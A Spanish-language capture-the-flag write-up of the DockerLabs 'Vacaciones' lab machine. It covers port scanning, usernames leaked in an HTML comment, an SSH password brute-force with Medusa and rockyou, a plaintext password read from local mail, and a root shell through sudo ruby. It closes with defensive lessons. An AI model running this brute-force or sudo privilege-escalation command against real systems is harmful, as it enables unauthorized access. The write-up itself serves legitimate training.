# Vacaciones — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🔵 Muy Fácil  
**SO:** Linux  
**Autor de la máquina:** Romabri  
**Fecha de creación:** 04/06/2024  
**Técnicas:** Nmap · Comentario HTML · Medusa · SSH · /var/mail · Privesc (ruby/sudo)

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración web — usuarios en el código fuente](#2-enumeración-web--usuarios-en-el-código-fuente)
3. [Acceso inicial — fuerza bruta SSH con Medusa](#3-acceso-inicial--fuerza-bruta-ssh-con-medusa)
4. [Movimiento lateral — correo de juan a camilo](#4-movimiento-lateral--correo-de-juan-a-camilo)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

```bash
sudo bash auto_deploy.sh vacaciones.tar
```

> IP asignada: `172.17.0.2`. El TTL de 64 en el ping confirma que es Linux.

```bash
ping -c 2 172.17.0.2
```

```
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.049 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.029 ms
```

Escaneo inicial:

```bash
nmap -Pn 172.17.0.2
```

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Escaneo con versiones:

```bash
nmap -p22,80 -sCV -Pn 172.17.0.2
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
```

---

## 2. Enumeración web — usuarios en el código fuente

La web devuelve una página en blanco. Inspeccionamos el código fuente (Ctrl+U):

```html
<!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
```

> 💡 **Los comentarios HTML son visibles para cualquiera.** Este comentario nos da dos usuarios: **juan** y **camilo**, y nos informa de que hay un correo interno importante.

---

## 3. Acceso inicial — fuerza bruta SSH con Medusa

Creamos un fichero con los dos usuarios:

```bash
echo -e "camilo\njuan" > usuarios.txt
```

Lanzamos Medusa — muestra los intentos uno a uno y para al encontrar cada contraseña:

```bash
medusa -U usuarios.txt -P ~/Descargas/rockyou.txt -h 172.17.0.2 -M ssh
```

```
ACCOUNT FOUND: [ssh] Host: 172.17.0.2 User: camilo Password: password1 [SUCCESS]
```

Contraseña encontrada: **camilo:password1**. Conectamos:

```bash
sudo ssh camilo@172.17.0.2
```

```
$ whoami
camilo
```

---

## 4. Movimiento lateral — correo de juan a camilo

Verificamos si camilo tiene sudo:

```bash
$ sudo -l
Sorry, user camilo may not run sudo on 43d78581682a.
```

No tiene. Enumeramos usuarios del sistema:

```bash
$ cd /home && ls
camilo  juan  pedro
```

El comentario HTML decía que juan dejó un correo a camilo. Revisamos `/var/mail`:

```bash
$ cd /var/mail/camilo && cat correo.txt
Hola Camilo,

Me voy de vacaciones y no he terminado el trabajo que me dio el jefe.
Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
```

> 💡 **`/var/mail`** almacena los buzones de correo locales de cada usuario. Es un lugar frecuentemente ignorado en los CTFs pero puede contener credenciales en texto claro.

Conectamos como juan con la contraseña del correo:

```bash
sudo ssh juan@172.17.0.2
```

```
juan@172.17.0.2's password: 2k84dicb
$ whoami
juan
```

---

## 5. Escalada de privilegios

Comprobamos permisos sudo de juan:

```bash
$ sudo -l
```

```
User juan may run the following commands on 43d78581682a:
    (ALL) NOPASSWD: /usr/bin/ruby
```

juan puede ejecutar **ruby como root sin contraseña**. GTFObins nos da el comando:

```bash
$ sudo ruby -e 'exec "/bin/sh"'
# whoami
root
```

> 💡 **`exec "/bin/sh"`** reemplaza el proceso de ruby por una shell. Como ruby corre como root, la shell también es root.

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Dónde | Impacto |
|----------------|-------|---------|
| **Usuarios en comentario HTML** | Código fuente de la web | Enumeración sin autenticación |
| **Contraseña débil en SSH** | Usuario camilo | Fuerza bruta exitosa |
| **Contraseña en correo local en texto plano** | `/var/mail/camilo/correo.txt` | Movimiento lateral a juan |
| **ruby con sudo sin restricción** | `/usr/bin/ruby` | Escalada a root |

**Para defenderse:**
- Nunca incluir información sensible en comentarios HTML — son públicos.
- "password1" aparece en el top 10 de cualquier diccionario. Usar contraseñas fuertes.
- Los correos con credenciales deben usar cifrado o enviarse por canales seguros.
- Auditar regularmente los permisos sudo de todos los usuarios.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al [repositorio](https://github.com/Caan31/Maquinas_DockerLabs)*
